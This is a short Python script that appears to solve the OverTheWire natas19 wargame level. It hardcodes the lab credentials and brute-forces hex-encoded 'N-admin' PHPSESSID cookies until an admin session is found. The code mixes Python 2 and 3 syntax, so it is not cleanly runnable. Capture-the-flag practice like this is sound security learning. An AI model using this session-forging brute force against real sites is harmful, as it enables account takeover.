#!/bin/python

import requests, binascii

url = "http://natas19.natas.labs.overthewire.org"
user = "natas19" 
pwd = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

#s = requests.session()

for i in range(1, 641):

	decoded = str(i) + "-admin"
	h = binascii.hexlify(decoded.encode())
	encoded = h.decode()
	
	cookies = {"PHPSESSID" : encoded}
	r = requests.get(url + "?debug", cookies=cookies, auth=(user,pwd))
	if "You are an admin" in r.content:
		print r.content
		break